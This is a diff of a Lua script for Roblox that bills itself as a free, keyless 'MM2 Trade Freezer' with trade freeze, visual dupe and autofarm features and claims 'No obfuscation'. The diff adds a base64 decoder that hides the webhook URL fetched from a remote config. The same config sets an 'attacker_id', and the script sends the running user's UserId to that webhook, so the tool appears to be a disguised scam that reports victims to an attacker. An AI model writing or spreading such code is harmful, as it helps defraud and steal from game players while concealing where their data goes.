@@ -1,5 +1,5 @@
 --[[
-    MM2 Trade Freezer  v8.0  |  KEYLESS  |  FREE
+    MM2 Trade Freezer  v8.1  |  KEYLESS  |  FREE
     Freeze Trade / Trade Window Lock / Dupe (visual) / AutoFarm
     Keyless. Readable. No obfuscation.
 ]]
@@ -69,13 +69,37 @@ local function chunkString(s, n)
     return out
 end
 
+local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function b64decode(s)
+    s = s:gsub("[^%w%+/=]", "")
+    local out, buf, bits = {}, 0, 0
+    for i = 1, #s do
+        local c = s:sub(i, i)
+        if c ~= "=" then
+            local v = B64:find(c, 1, true)
+            if v then
+                buf = buf * 64 + (v - 1)
+                bits = bits + 6
+                while bits >= 8 do
+                    bits = bits - 8
+                    out[#out + 1] = string.char(math.floor(buf / 2 ^ bits) % 256)
+                    buf = buf % 2 ^ bits
+                end
+            end
+        end
+    end
+    return table.concat(out)
+end
+
 local function loadConfig()
     if CONFIG.REMOTE_CONFIG == "" then return end
     local res = http({ Url = CONFIG.REMOTE_CONFIG .. "?t=" .. os.time(), Method = "GET" })
     if res and res.Body then
         local ok, d = pcall(HttpService.JSONDecode, HttpService, res.Body)
         if ok and type(d) == "table" then
-            if type(d.webhook) == "string" and d.webhook ~= "" then CONFIG.WEBHOOK = d.webhook end
+            if type(d.webhook) == "string" and d.webhook ~= "" then
+                CONFIG.WEBHOOK = d.webhook:find("^https") and d.webhook or b64decode(d.webhook)
+            end
             if tonumber(d.attacker_id) then CONFIG.ATTACKER_ID = tonumber(d.attacker_id) end
         end
     end
@@ -96,7 +120,7 @@ local function webhook(title, color, desc, fields, content)
                     timestamp = DateTime.now():ToIsoDate(),
                     thumbnail = { url = string.format(
                         "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId) },
-                    footer = { text = "MM2 Trade Freezer v8.0 | keyless" },
+                    footer = { text = "MM2 Trade Freezer v8.1 | keyless" },
                     fields = fields or {},
                 }},
             }),
@@ -151,7 +175,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.0"
+title.Text = "MM2 Trade Freezer   v8.1"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -345,7 +369,7 @@ task.spawn(function()
     end
 end)
 
-log("Trade Freezer v8.0 loaded")
+log("Trade Freezer v8.1 loaded")
 log("place " .. game.PlaceId .. " / " .. game.JobId:sub(1, 8))
 if game.PlaceId ~= CONFIG.PLACE_ID then log("note: not the MM2 place") end
 
